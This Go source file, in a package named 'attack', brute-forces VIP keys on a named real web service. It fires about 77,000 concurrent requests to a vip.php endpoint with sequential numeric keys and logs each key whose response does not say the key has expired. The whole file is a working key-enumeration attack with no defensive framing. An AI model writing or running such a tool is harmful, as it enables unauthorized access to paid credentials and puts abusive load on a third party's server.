package attack

import (
	"funny/spider_client"
	"github.com/axgle/mahonia"
	"log"
	"strconv"
	"strings"
)

func Init() {
	log.Print("attack init")
	spider := spider_client.New(1000, 10, 0, true)
	for i := 22744; i < 100000; i++ {
		go func(i int) {
			res, err := spider.Get("http://www.90api.cn/vip.php?key="+strconv.Itoa(584198000+i)+"&sl=1", 0)
			if err != nil {
				log.Println(err, res, i)
			} else {
				str := ConvertToString(res.Body, "gbk", "utf-8")
				if strings.Index(str, "已过期") < 0 {
					log.Println(str, i)
				}
			}
		}(i)
	}
	select {}
}

func ConvertToString(src string, srcCode string, tagCode string) string {
	srcCoder := mahonia.NewDecoder(srcCode)
	srcResult := srcCoder.ConvertString(src)
	tagCoder := mahonia.NewDecoder(tagCode)
	_, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
	result := string(cdata)
	return result
}
